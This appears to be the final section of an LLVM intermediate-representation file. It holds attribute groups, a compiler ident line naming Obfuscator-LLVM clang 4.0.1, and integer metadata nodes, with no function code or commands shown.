attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146594516}
!2 = !{i32 -2146593825}
!3 = !{i32 -2146593131}
!4 = !{i32 -2146592376}
!5 = !{i32 -2146591549}
!6 = !{i32 -2146590728}
!7 = !{i32 -2146589713}
